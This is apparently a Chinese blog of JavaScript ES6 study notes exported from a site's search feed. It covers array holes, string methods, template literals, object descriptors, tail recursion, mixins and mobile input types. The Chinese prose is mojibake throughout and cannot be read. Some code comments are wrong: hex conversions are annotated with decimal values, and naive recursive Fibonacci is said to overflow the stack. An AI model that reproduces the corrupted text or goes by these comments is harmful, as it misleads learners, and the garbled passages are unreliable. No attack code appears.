'a']// forEach(), filter(), reduce(), every() å’Œsome()éƒ½ä¼šè·³è¿‡ç©ºä½arr.forEach((item, index) =&gt; &#123; console.log(index) // 1&#125;)// join()å’ŒtoString()ä¼šå°†ç©ºä½è§†ä¸ºundefinedï¼Œè€Œundefinedå’Œnullä¼šè¢«å¤„ç†æˆç©ºå­—ç¬¦ä¸²ã€‚console.log([undefined, , 'a'].join(''))// for...ofå¯ä»¥éåŽ†åˆ°ç©ºä½for (let i of arr) &#123; console.log(i) // a undefined&#125;// æ‹“å±•è¿ç®—ç¬¦å°†ç©ºä½è½¬ä¸ºundefinedconsole.log([...[2, , 3]]) // [2, undefined, 3]// Array.fromå°†æ•°ç»„ç©ºä½è½¬åŒ–ä¸ºundefinedconsole.log(Array.from([4, , 5])) // [4, undefined, 5]// fill()ä¼šå°†ç©ºä½è§†ä¸ºæ­£å¸¸æ•°ç»„ä½ç½®console.log(new Array(3).fill('a')) // ["a", "a", "a"]// entries() ã€keys() ã€values() ã€find()å’ŒfindIndex()ä¼šå°†ç©ºä½å¤„ç†æˆundefinedã€‚ ES6 ä¹‹ StringcodePointAt æ–¹æ³•åœ¨ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸Šï¼Œæ­£ç¡®åœ°è¯†åˆ«äº†â€œð ®·â€ï¼Œè¿”å›žäº†å®ƒçš„åè¿›åˆ¶ç ç‚¹ 134071ï¼ˆå³åå…­è¿›åˆ¶çš„ 20BB7ï¼‰ã€‚åœ¨ç¬¬äºŒä¸ªå­—ç¬¦ï¼ˆå³â€œð ®·â€çš„åŽä¸¤ä¸ªå­—èŠ‚ï¼‰å’Œç¬¬ä¸‰ä¸ªå­—ç¬¦â€œaâ€ä¸Šï¼ŒcodePointAt æ–¹æ³•çš„ç»“æžœä¸Ž charCodeAt æ–¹æ³•ç›¸åŒã€‚ 12345678910111213141516let s = 'ð ®·'console.log(s.charCodeAt(0)) // 55362console.log(s.charCodeAt(1)) // 57271console.log(s.codePointAt(0)) // 134071console.log(s.codePointAt(1)) // 57271console.log(s.codePointAt(0).toString(16)) // 134071console.log(s.codePointAt(1).toString(16)) // 57271let text = String.fromCodePoint(0x20bb7, 0xdfb7)// for...ofèƒ½æ­£ç¡®éåŽ†å‡ºutf-16å­—ç¬¦for (let t of text) &#123; console.log(t)&#125; endsWith çš„è¡Œä¸ºä¸Žå…¶ä»–ä¸¤ä¸ªæ–¹æ³•æœ‰æ‰€ä¸åŒï¼Œå®ƒé’ˆå¯¹å‰ n ä¸ªå­—ç¬¦ï¼Œè€Œå…¶ä»–ä¸¤ä¸ªæ–¹æ³•é’ˆå¯¹ä»Žç¬¬ n ä¸ªä½ç½®ç›´åˆ°å­—ç¬¦ä¸²ç»“æŸã€‚ 1234let str = 'Hello world'console.log(str.startsWith('llo', 2)) // trueconsole.log(str.endsWith('d', 11)) // trueconsole.log(str.includes('wo', 1)) // true repeat() 123456// å°æ•°ä¼šè¢«å–æ•´console.log('x'.repeat(3.6)) // "xxx"// 0 - -1 è¢«è§†ä¸º0console.log('y'.repeat(-0.1)) // ""// éžæ•°å­—ï¼Œè½¬åŒ–æˆæ•°å­—console.log('z'.repeat('z')) // "" padStart() padEnd() 123456789101112// å¤´éƒ¨è¡¥å…¨console.log('x'.padStart(5, 'ab')) // "ababx"// å°¾éƒ¨è¡¥å…¨console.log('x'.padEnd(5, 'ab')) // "xabab"// åŽŸå­—ç¬¦ä¸²é•¿åº¦ï¼Œç­‰äºŽæˆ–å¤§äºŽæŒ‡å®šæœ€å°é•¿åº¦ï¼Œåˆ™è¿”å›žåŽŸå­—ç¬¦ä¸²console.log('xxx'.padStart(3, 'ab')) // "xxx"// ç”¨æ¥è¡¥å…¨çš„å­—ç¬¦ä¸²ä¸ŽåŽŸå­—ç¬¦ä¸²ï¼Œä¸¤è€…çš„é•¿åº¦ä¹‹å’Œè¶…è¿‡äº†æŒ‡å®šçš„æœ€å°é•¿åº¦ï¼Œåˆ™ä¼šæˆªåŽ»è¶…å‡ºä½æ•°çš„è¡¥å…¨å­—ç¬¦ä¸²console.log('xxx'.padStart(5, 'abcdef')) // "abxxx"// çœç•¥ç¬¬äºŒä¸ªå‚æ•°ï¼Œé»˜è®¤ä½¿ç”¨ç©ºæ ¼è¡¥å…¨é•¿åº¦console.log('xxx'.padStart(5)) // " xxx"console.log('12'.padStart(10, 'YYYY-MM-DD')) // "YYYY-MM-12" æ¨¡æ¿å­—ç¬¦ä¸²é‡Œå¯ä»¥åµŒå¥— 12345678910111213141516171819202122232425let $body = document.querySelector('body')const data = [ &#123; first: 'wu', last: 'wenhua' &#125;, &#123; first: 'xiao', last: 'hua' &#125;]const temp = (d) =&gt; ` &lt;table&gt; $&#123;d .map((item) =&gt; &#123; return ` &lt;tr&gt; &lt;td&gt;$&#123;item.first&#125;&lt;/td&gt; &lt;td&gt;$&#123;item.last&#125;&lt;/td&gt; &lt;/tr&gt; ` &#125;) .join('')&#125; &lt;/table&gt;`console.log(temp(data))$body.innerHTML = temp(data) æ‰§è¡Œä¸€æ®µå­—ç¬¦ä¸² 1234let str = `return ` + '`Hello $&#123;name&#125;`'let func = new Function('name', str)console.log(func)console.log(func('wuwh')) æ ‡ç­¾æ¨¡æ¿ 123456789101112131415161718function passthru(literals, ...values) &#123; let output = '' let index for (index = 0; index &lt; values.length; index++) &#123; output += literals[index] + values[index] &#125; output += literals[index] return output&#125;let name = 'wen'let age = 22let str = passthru`My name is $&#123;name&#125;, I am $&#123;age&#125; old` // tagå‡½æ•°è°ƒç”¨console.log(str) tag å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•° stringsï¼Œæœ‰ä¸€ä¸ª raw å±žæ€§ï¼Œä¹ŸæŒ‡å‘ä¸€ä¸ªæ•°ç»„ 12345678tag`abc\nefg`function tag(str) &#123; console.log(str.raw[0]) // abc\nefg&#125;// å……å½“æ¨¡æ¿å­—ç¬¦ä¸²çš„å¤„ç†å‡½æ•°ï¼Œè¿”å›žä¸€ä¸ªæ–œæ éƒ½è¢«è½¬ä¹‰çš„å­—ç¬¦ä¸²console.log(String.raw`abc\nefg`) â€”â€” 2018/1/3 ES6 ä¹‹ ObjectæŠŠè¡¨è¾¾å¼æ”¾åˆ°æ–¹æ‹¬å·é‡Œï¼Œä½œä¸ºå¯¹è±¡çš„å±žæ€§å 123456let propKey = 'foo'let obj = &#123; [propKey]: true, ['a' + 'b']: 'ab'&#125;console.log(obj.ab) // "ab" æŠŠè¡¨è¾¾å¼æ”¾åˆ°æ–¹æ‹¬å·é‡Œï¼Œä½œä¸ºå¯¹è±¡ä¸‹çš„æ–¹æ³•å 123456let obj = &#123; ['h' + 'ello']() &#123; return 'hi' &#125;&#125;console.log(obj.hello()) // "hi" å±žæ€§åè¡¨è¾¾å¼å¦‚æžœæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¼šè‡ªåŠ¨è½¬åŒ–ä¸ºå­—ç¬¦ä¸²[object Object] 12345const propKey = &#123; a: 1 &#125;const obj = &#123; [propKey]: 1&#125;console.log(obj) getter å’Œ setter å‡½æ•° name å±žæ€§åœ¨è¯¥æ–¹æ³•çš„å±žæ€§æè¿°å¯¹è±¡çš„ get å’Œ set å±žæ€§ä¸Šé¢ 12345678const obj = &#123; get foo() &#123;&#125;, set foo(x) &#123;&#125;&#125;const descriptor = Object.getOwnPropertyDescriptor(obj, 'foo')console.log(descriptor.get.name) // "foo"console.log(descriptor.set.name) // "foo" Function æž„é€ å‡½æ•°åˆ›é€ çš„å‡½æ•°ï¼Œname å±žæ€§è¿”å›ž anonymous 1console.log(new Function().name) // anonymous bind æ–¹æ³•åˆ›é€ çš„å‡½æ•°ï¼Œname å±žæ€§è¿”å›ž bound åŠ ä¸ŠåŽŸå‡½æ•°çš„åå­— 12let doSomething = function () &#123;&#125;console.log(doSomething.bind().name) // bound doSomething Object.is() åŒå€¼ç›¸ç­‰ ä¸åŒäºŽè¿ç®—ç¬¦ï¼ˆ===ï¼‰ï¼Œä¸€æ˜¯+0 ä¸ç­‰äºŽ-0ï¼ŒäºŒæ˜¯ NaN ç­‰äºŽè‡ªèº« 12console.log(Object.is(+0, -0)) // falseconsole.log(Object.is(NaN, NaN)) // true assign 12345678910111213141516171819202122232425262728let a = Object.assign(2)console.log(typeof a)// ç”±äºŽundefinedå’Œnullæ— æ³•è½¬æˆå¯¹è±¡ï¼Œæ‰€ä»¥å¦‚æžœå®ƒä»¬ä½œä¸ºå‚æ•°ï¼Œå°±ä¼šæŠ¥é”™// Object.assign(undefined);// éžé¦–å‚ï¼Œundefinedå’Œnullæ— æ³•è½¬æˆå¯¹è±¡å°±ä¼šè·³è¿‡let b = Object.assign(a, undefined)console.log(a === b) //true// å…¶ä»–ç±»åž‹çš„å€¼ï¼ˆæ•°å€¼ã€å­—ç¬¦ä¸²å’Œå¸ƒå°”å€¼ï¼‰ä¸ä¼šäº§ç”Ÿæ•ˆæžœlet c = Object.assign(a, 2, true, undefined)console.log(c)console.log(a === c) // true// Object.assignæ‹·è´çš„å±žæ€§æ˜¯æœ‰é™åˆ¶çš„ï¼Œåªæ‹·è´æºå¯¹è±¡çš„è‡ªèº«å±žæ€§ï¼ˆä¸æ‹·è´ç»§æ‰¿å±žæ€§ï¼‰ï¼Œ// ä¹Ÿä¸æ‹·è´ä¸å¯æžšä¸¾çš„å±žæ€§ï¼ˆenumerable: falseï¼‰// sourceå¯¹è±¡çš„fooå±žæ€§æ˜¯ä¸€ä¸ªå–å€¼å‡½æ•°ï¼ŒObject.assignä¸ä¼šå¤åˆ¶è¿™ä¸ªå–å€¼å‡½æ•°ï¼Œ// åªä¼šæ‹¿åˆ°å€¼ä»¥åŽï¼Œå°†è¿™ä¸ªå€¼å¤åˆ¶è¿‡åŽ»const source = &#123; get foo() &#123; return 1 &#125;&#125;const target = &#123;&#125;console.log(Object.assign(target, source)) // &#123;foo: 1&#125; ES6 è§„å®šï¼Œæ‰€æœ‰ class çš„åŽŸåž‹æ–¹æ³•éƒ½æ˜¯ä¸å¯æžšä¸¾çš„ 1234567let cd = Object.getOwnPropertyDescriptor( class &#123; foo() &#123;&#125; &#125;.prototype, 'foo').enumerableconsole.log(cd) // false Reflect.ownKeys éåŽ†å¯¹è±¡å±žæ€§ç±»åž‹é¡ºåº æ•°å­— -&gt; å­—ç¬¦ä¸² -&gt; Symbol 1console.log(Reflect.ownKeys(&#123; [Symbol()]: 0, a: 1, 0: 2 &#125;)) // ["0", "a", Symbol()] ES2017 å¼•å…¥äº† Object.getOwnPropertyDescriptors æ–¹æ³•ï¼Œè¿”å›žæŒ‡å®šå¯¹è±¡æ‰€æœ‰è‡ªèº«å±žæ€§ï¼ˆéžç»§æ‰¿å±žæ€§ï¼‰çš„æè¿°å¯¹è±¡ 123456789const obj = &#123; foo: 123, [Symbol('aaa')]: 'aaa', get bar() &#123; return 'abc' &#125;&#125;console.log(Object.getOwnPropertyDescriptors(obj)) getOwnPropertyDescriptors å¯åº”ç”¨äºŽå°†ä¸¤ä¸ªå¯¹è±¡åˆå¹¶ï¼ŒåŒ…æ‹¬ set å’Œ get 123456789101112const shallowMerge = (target, source) =&gt; Object.defineProperties(target, Object.getOwnPropertyDescriptors(source))console.log( shallowMerge( &#123;&#125;, &#123; set foo(val) &#123; console.log(val) &#125; &#125; )) å¯¹è±¡ä¸Šéƒ¨ç½²protoå±žæ€§ï¼Œä¸€ä¸‹ä¸‰ç§æ–¹æ³•éƒ½èƒ½è¾¾åˆ°æ•ˆæžœ 1234567891011121314151617181920let prot = &#123;&#125;const obj1 = &#123; __proto__: prot, foo: 123&#125;const obj2 = Object.assign(Object.create(prot), &#123; foo: 123&#125;)const obj3 = Object.create( prot, Object.getOwnPropertyDescriptors(&#123; foo: 123 &#125;))console.log('obj1:', obj1)console.log('obj2:', obj2)console.log('obj3:', obj3) super å…³é”®å­—è¡¨ç¤ºåŽŸåž‹å¯¹è±¡æ—¶ï¼Œåªèƒ½ç”¨åœ¨å¯¹è±¡çš„æ–¹æ³•ä¹‹ä¸­ï¼Œç”¨åœ¨å…¶ä»–åœ°æ–¹éƒ½ä¼šæŠ¥é”™ï¼Œsuper ç­‰ä»·äºŽ Object.getPrototypeOf(this) 123456789101112131415const obj = &#123; a: 2, getShow() &#123; return super.show() &#125;&#125;Object.setPrototypeOf(obj, &#123; a: 1, show() &#123; return this.a &#125;&#125;)console.log(obj.getShow()) // 2 æ‹“å±•è¿ç®—ç¬¦çš„è§£æž„èµ‹å€¼ï¼Œä¸èƒ½å¤åˆ¶ç»§æ‰¿è‡ªåŽŸåž‹å¯¹è±¡çš„å±žæ€§ 12345678910111213141516let a = &#123; a: 1 &#125;;let b = &#123; b: 2 &#125;;a.__proto__ = b;let &#123; ...c &#125; = a;console.log(c); // &#123;a: 1&#125;console.log(c.b); // undefined// å˜é‡yå’Œzæ˜¯æ‰©å±•è¿ç®—ç¬¦çš„è§£æž„èµ‹å€¼ï¼Œåªèƒ½è¯»å–å¯¹è±¡oè‡ªèº«çš„å±žæ€§const o = Object.create(&#123; x: 1, y: 2 &#125;);o.z = 3;let &#123; x, ...&#123; y, z &#125; &#125; = o;console.log(x); // 1console.log(y); // undefinedconsole.log(z); // 3 â€”â€” 2018/1/4 12345678910&#123; // æœ‰é»˜è®¤å€¼çš„å‚æ•°ä¸æ˜¯å°¾å‚æ•°ï¼Œæ— æ³•åªçœç•¥è¯¥å‚æ•° function f(x = 1, y) &#123; return [x, y] &#125; // f(, 2); // æŠ¥é”™ // ä¼ å…¥undefinedï¼Œå°†è§¦å‘é»˜è®¤å€¼ console.log(f(undefined, null)) // [1, null]&#125; 123456// æŒ‡å®šé»˜è®¤å€¼åŽï¼Œå‡½æ•°çš„lengthå±žæ€§å°†å¤±çœŸconsole.log(function (a, b, c = 5) &#123;&#125;.length) // 2console.log(function (...rest) &#123;&#125;.length) // 0// è®¾ç½®äº†é»˜è®¤å€¼çš„å‚æ•°ä¸æ˜¯å°¾å‚æ•°ï¼Œé‚£ä¹ˆlengthå±žæ€§ä¹Ÿä¸å†è®¡å…¥åŽé¢çš„å‚æ•°äº†console.log(function (a = 5, b, c) &#123;&#125;.length) // 0 â€”â€” 2018/1/5 ES6 ä¹‹ functionç®­å¤´å‡½æ•°ä¸èƒ½å½“ä½œæž„é€ å‡½æ•°ï¼ŒåŽŸå› åœ¨äºŽç®­å¤´å‡½æ•°å†…éƒ¨æ²¡æœ‰ thisï¼Œè€Œæ˜¯å¼•ç”¨å¤–å±‚çš„ this 12345let Fn = () =&gt; &#123; this.age = '20'&#125;let fn = new Fn() // Uncaught TypeError: Fn is not a constructor ç®­å¤´å‡½æ•°ä¸èƒ½ç”¨ä½œ Generator å‡½æ•° 12345let g = function* () =&gt; &#123; yield 1;&#125;;console.log( g().next() ); // Uncaught SyntaxError: Unexpected token =&gt; ç®­å¤´å‡½æ•°æ²¡æœ‰è‡ªå·±çš„ thisï¼Œæ‰€ä»¥ bind æ–¹æ³•æ— æ•ˆï¼Œå†…éƒ¨çš„ this æŒ‡å‘å¤–éƒ¨çš„ this 12345let res = function () &#123; return [(() =&gt; this.x).bind(&#123; x: 'inner' &#125;)()]&#125;.call(&#123; x: 'outer' &#125;)console.log('res:', res) // ["outer"] â€œå°¾è°ƒç”¨ä¼˜åŒ–â€æ„ä¹‰ï¼šå‡½æ•°æ‰§è¡Œåˆ°æœ€åŽä¸€æ­¥ï¼Œä¸ä¿ç•™å¤–å±‚å‡½æ•°çš„è°ƒç”¨å¸§ï¼Œåªä¼šä¿å­˜å†…éƒ¨å‡½æ•°è°ƒç”¨å¸§ï¼Œè¿™æ ·èŠ‚çœäº†å†…å­˜ã€‚æ³¨æ„ï¼Œåªæœ‰ä¸å†ç”¨åˆ°å¤–å±‚å‡½æ•°å†…éƒ¨å˜é‡ï¼Œå†…å±‚å‡½æ•°çš„è°ƒç”¨å¸§æ‰ä¼šå–ä»£å¤–å±‚å‡½æ•°çš„è°ƒç”¨å¸§ï¼Œå¦åˆ™æ— æ³•è¿›è¡Œâ€œå°¾è°ƒç”¨ä¼˜åŒ–â€ã€‚ 1234567function addOne(a) &#123; var one = 1 function inner(b) &#123; return b + one // å«æœ‰å¤–å±‚å˜é‡one &#125; return inner(a)&#125; å°¾é€’å½’çš„å®žçŽ°ï¼Œå¾€å¾€éœ€è¦æ”¹å†™é€’å½’å‡½æ•°ï¼Œç¡®ä¿æœ€åŽä¸€æ­¥åªè°ƒç”¨è‡ªèº«ï¼Œåšåˆ°è¿™ä¸€ç‚¹çš„æ–¹æ³•ï¼Œå°±æ˜¯æŠŠæ‰€æœ‰ç”¨åˆ°çš„å†…éƒ¨å˜é‡æ”¹å†™æˆå‡½æ•°çš„å‚æ•°ã€‚ 1234567891011// æ™®é€šæ–¹æ³•é€’å½’function Fibonacci(n) &#123; if (n &lt;= 1) &#123; return 1 &#125; return Fibonacci(n - 1) + Fibonacci(n - 2)&#125;console.log('Fibonacci 100:', Fibonacci(10)) // 89console.log('Fibonacci 100:', Fibonacci(100)) // å †æ ˆæº¢å‡º 1234567891011// å°¾é€’å½’function tailFibonacci(n, ac1 = 1, ac2 = 1) &#123; if (n &lt;= 1) &#123; return ac2 &#125; return tailFibonacci(n - 1, ac2, ac1 + ac2)&#125;console.log('tailFibonacci 10:', tailFibonacci(10)) // 89console.log('tailFibonacci 100:', tailFibonacci(100)) // 573147844013817200000 ES6 ä¹‹ class ç»§æ‰¿ï¼ˆç»­ï¼‰ç»§æ‰¿ Object å­ç±»ï¼Œæœ‰ä¸€ä¸ªè¡Œä¸ºå·®å¼‚ï¼ŒES6 æ”¹å˜äº† Object æž„é€ å‡½æ•°çš„è¡Œä¸ºï¼Œå‘çŽ°ä¸æ˜¯é€šè¿‡ new Object()å½¢å¼è°ƒç”¨ï¼ŒObject æž„é€ å‡½æ•°å¿½ç•¥å‚æ•° 12345678class NewObj extends Object &#123; constructor() &#123; super(...arguments); &#125;&#125;let o = new NewObj(&#123;attr: true&#125;);console.log(o.attr === true); //false å°†å¤šä¸ªç±»çš„æŽ¥å£â€œæ··å…¥â€å¦ä¸€ä¸ªç±» 12345678910111213141516171819202122232425262728293031323334353637383940414243function mix(...mixins) &#123; class Mix &#123;&#125; for (let mixin of mixins) &#123; copyProperties(Mix, mixin) // æ‹·è´å®žä¾‹å±žæ€§ copyProperties(Mix.prototype, mixin.prototype) // æ‹·è´åŽŸåž‹å±žæ€§ &#125; return Mix&#125;function copyProperties(target, source) &#123; for (let key of Reflect.ownKeys(source)) &#123; if (key !== 'constructor' &amp;&amp; key !== 'prototype' &amp;&amp; key !== 'name') &#123; let desc = Object.getOwnPropertyDescriptor(source, key) Object.defineProperty(target, key, desc) &#125; &#125;&#125;class School &#123; constructor() &#123; this.name = 'qing' &#125; getAddress() &#123; return 'beijing' &#125;&#125;class Student &#123; constructor() &#123; this.name = 'wang xiao' &#125; getAddress() &#123; return 'shenzhen' &#125;&#125;class Ins extends mix(School, Student) &#123;&#125;let ins = new Ins()console.log(ins.getAddress()) â€”â€” 2018/1/8 å…³äºŽä»Žé¡µé¢å¤–éƒ¨åŠ è½½ js æ–‡ä»¶ å¸¦æœ‰ src å±žæ€§&lt;script&gt; æ ‡ç­¾ä¹‹é—´è¿˜åŒ…å« JavaScript ä»£ç ï¼Œåˆ™åªä¼šä¸‹è½½å¹¶æ‰§è¡Œå¤–éƒ¨è„šæœ¬æ–‡ä»¶ï¼ŒåµŒå…¥çš„ä»£ç ä¼šè¢«å¿½ç•¥ï¼› ä¸å­˜åœ¨ defer å’Œ async å±žæ€§ï¼Œæµè§ˆå™¨å°±ä¼šæŒ‰ç…§&lt;script&gt;åœ¨é¡µé¢ä¸­å‡ºçŽ°çš„å…ˆåŽé¡ºåºå¯¹å®ƒä»¬ä¾æ¬¡è¿›è¡Œè§£æžï¼› &lt;script&gt;æœ‰ defer å±žæ€§ï¼Œæµè§ˆå™¨ä¼šç«‹åˆ»ä¸‹è½½ï¼Œä½†å»¶æ—¶æ‰§è¡Œï¼ˆå»¶æ—¶åˆ°&lt;/html&gt;åŽæ‰§è¡Œï¼‰ï¼ŒHTML5 è§„å®šæŒ‰ç…§æ–‡ä»¶å‡ºçŽ°çš„å…ˆåŽé¡ºåºæ‰§è¡Œï¼Œå…ˆäºŽ DOMContentLoaded äº‹ä»¶æ‰§è¡Œï¼› &lt;script&gt;æœ‰ async å±žæ€§ï¼Œæµè§ˆå™¨ç«‹åˆ»ä¸‹è½½ï¼Œä¸ä¿è¯æŒ‰ç…§å…ˆåŽé¡ºåºæ‰§è¡Œï¼Œä¸€å®šåœ¨ load äº‹ä»¶å‰æ‰§è¡Œï¼Œä½†ä¸ä¸€å®šåœ¨ DOMContentLoaded ä¹‹å‰æ‰§è¡Œï¼› é‡ç»˜ repaint ä¸Žé‡æŽ’ reflowé‡ç»˜ï¼šå½“æ”¹å˜é‚£äº›ä¸ä¼šå½±å“å…ƒç´ åœ¨ç½‘é¡µä¸­çš„ä½ç½®æ ·å¼æ—¶ï¼Œå¦‚ background-colorï¼Œborderï¼Œvisibilityï¼Œæµè§ˆå™¨åªä¼šç”¨æ–°çš„æ ·å¼å°†å…ƒç´ é‡ç»˜ä¸€æ¬¡ã€‚é‡æŽ’ï¼šå½“æ”¹å˜å½±å“åˆ°æ–‡æœ¬å†…å®¹æˆ–ç»“æž„ï¼Œæˆ–è€…å…ƒç´ ä½ç½®æ—¶ï¼Œé‡æŽ’å°±ä¼šå‘ç”Ÿã€‚ â€”â€” 2018/1/19 è¾“å…¥æ¡†å¼¹èµ·æ•°å­—é”®ç›˜1&lt;input type="tel" novalidate="novalidate" pattern="[0-9]*" id="q2" value="" name="q2" verify="å­¦å·" /&gt; type=&quot;tel&quot; ä¼˜ç‚¹æ˜¯ iOS å’Œ Android çš„é”®ç›˜è¡¨çŽ°éƒ½å·®ä¸å¤š ç¼ºç‚¹æ˜¯é‚£äº›å­—æ¯å¥½å¤šä½™ï¼Œè™½ç„¶æˆ‘æ²¡æœ‰å¼ºè¿«ç—‡ä½†è¿˜æ˜¯æ„Ÿè§‰æ€ªæ€ªçš„å•Šã€‚ type=&quot;number&quot; ä¼˜ç‚¹æ˜¯ Android ä¸‹å®žçŽ°çš„ä¸€ä¸ªçœŸæ­£çš„æ•°å­—é”®ç›˜ ç¼ºç‚¹ä¸€ï¼šiOS ä¸‹ä¸æ˜¯ä¹å®«æ ¼é”®ç›˜ï¼Œè¾“å…¥ä¸æ–¹ä¾¿ ç¼ºç‚¹äºŒï¼šæ—§ç‰ˆ Androidï¼ˆåŒ…æ‹¬å¾®ä¿¡æ‰€ç”¨çš„ X5 å†…æ ¸ï¼‰åœ¨è¾“å…¥æ¡†åŽé¢ä¼šæœ‰è¶…çº§é¸¡è‚‹çš„å°å°¾å·´ï¼Œå¥½åœ¨ Android 4.4.4 ä»¥åŽç»™åŽ»æŽ‰äº†ã€‚ ä¸è¿‡å¯¹äºŽç¼ºç‚¹äºŒï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ webkit ç§æœ‰çš„ä¼ªå…ƒç´ ç»™ fix æŽ‰ï¼š 123456input[type='number']::-webkit-inner-spin-button,input[type='number']::-webkit-outer-spin-button &#123; -webkit-appearance: none; appearance: none; margin: 0;&#125; pattern pattern ç”¨äºŽéªŒè¯è¡¨å•è¾“å…¥çš„å†…å®¹ï¼Œé€šå¸¸ HTML5 çš„ type å±žæ€§ï¼Œæ¯”å¦‚ emailã€telã€numberã€data ç±»ã€url ç­‰ï¼Œå·²ç»è‡ªå¸¦äº†ç®€å•çš„æ•°æ®æ ¼å¼éªŒè¯åŠŸèƒ½äº†ï¼ŒåŠ ä¸Š pattern åŽï¼Œå‰ç«¯éƒ¨åˆ†çš„éªŒè¯æ›´åŠ ç®€å•é«˜æ•ˆäº†ã€‚ novalidate novalidate å±žæ€§è§„å®šå½“æäº¤è¡¨å•æ—¶ä¸å¯¹å…¶è¿›è¡ŒéªŒè¯ èŽ·å–å¯¹è±¡å±žæ€§çš„ä¸€äº›æ–¹æ³• Object.getOwnPropertyNames èŽ·å–å¯¹è±¡æœ¬èº«å±žæ€§åï¼ŒåŒ…æ‹¬ä¸å¯æžšä¸¾ï¼ˆenumerable: false;ï¼‰å±žæ€§ï¼Œä¸åŒ…æ‹¬ Symbol å±žæ€§ï¼› Object.getOwnPropertySymbols èŽ·å–å¯¹è±¡æœ¬èº«çš„ Symbol å±žæ€§åï¼› Object.keys èŽ·å–å¯¹è±¡æœ¬èº«å±žæ€§åï¼Œä¸åŒ…æ‹¬ä¸å¯æžšä¸¾å±žæ€§å’Œ Symbol å±žæ€§ï¼› Reflect.ownKeys èŽ·å–å¯¹è±¡æœ¬èº«æ‰€æœ‰å±žæ€§ï¼Œç­‰äºŽ Object.getOwnPropertyNames + Object.getOwnPropertySymbolsï¼› key in obj èŽ·å–å¯¹è±¡æœ¬èº«å±žæ€§å’ŒåŽŸåž‹å±žæ€§ï¼Œä¸åŒ…æ‹¬ä¸å¯æžšä¸¾å±žæ€§å’Œ Symbol å±žæ€§ï¼› 12345678910111213141516171819202122232425262728293031323334const obj = &#123; a: 1, b: '2', [Symbol.for('foo')]: 'foo', [Symbol.for('bar')]: 'bar'&#125;const target = Object.create(obj)target.c = truetarget[Symbol.for('zoo')] = 'zoo'Object.defineProperty(target, 'f', &#123; writable: false, enumerable: false, configurable: true, value: 'f'&#125;)const handler = &#123; ownKeys(target) &#123; return Reflect.ownKeys(target) &#125;&#125;const proxy = new Proxy(target, handler)console.log('Object.getOwnPropertyNames: ', Object.getOwnPropertyNames(proxy)) // ['c', 'f']console.log('Object.getOwnPropertySymbols: ', Object.getOwnPropertySymbols(proxy)) // [Symbol(zoo)]console.log('Object.keys: ', Object.keys(proxy)) // ['c']console.log('Reflect.ownKeys: ', Reflect.ownKeys(proxy)) // ['c', 'f', Symbol(zoo)]for (let key in proxy) &#123; console.log('key: ', key) // 'c' 'a' 'b'&#125; åˆ¤æ–­æ˜¯å¦æ˜¯æ•°ç»„12345678910111213141516171819var arr = []// ES6console.log(Array.isArray(arr))// instanceofconsole.log(arr instanceof Array)// constructorconsole.log(arr.__proto__.constructor === Array)// getPrototypeOfconsole.log(Object.getPrototypeOf(arr).constructor === Array)// isPrototypeOfconsole.log(Array.prototype.isPrototypeOf(arr))// Object.prototype.toStringconsole.log(Object.prototype.toString.apply(arr).slice(8, -1) === 'Array') Object.definedProperty æ‹¦æˆªXMLHttpRequestè¯·æ±‚ï¼Œè§£å†³è·¨åŸŸé—®é¢˜ç¦»çº¿å’Œåœ¨çº¿èµ„æºè¿‡æœŸæ‹¦æˆªcookie åŒæ­¥cookieå‘ç”Ÿå˜åŒ–]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
</search>
